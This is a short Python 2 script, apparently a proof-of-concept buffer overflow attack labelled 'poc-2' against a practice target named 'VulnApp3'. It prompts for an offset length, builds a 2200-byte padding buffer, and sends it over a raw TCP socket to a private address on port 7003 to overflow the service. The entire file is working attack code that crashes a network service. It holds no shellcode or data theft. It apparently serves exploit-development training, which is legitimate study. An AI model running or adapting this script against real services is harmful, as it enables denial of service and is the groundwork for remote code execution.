#!/usr/bin/python
import socket
import time

segment_size = int(raw_input("[*] Insert the size for offset chars: "))

try:
  print "[*] Strating buffer overflow attack against VulnApp3: poc-2"
  time.sleep(1)
  print "[*] Setup the buffer"
  payload = "A" * (2200 - segment_size)
  offset = "B" * segment_size 

  mybuffer = payload + offset
  print "[*] Buffer size is: " + str(len(mybuffer))
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("192.168.128.10", 7003))
  s.send(mybuffer)
  s.close()

  print "[*] Flowding finish!"
  time.sleep(1)
except:
  print "[*] Error occur could not connect!"


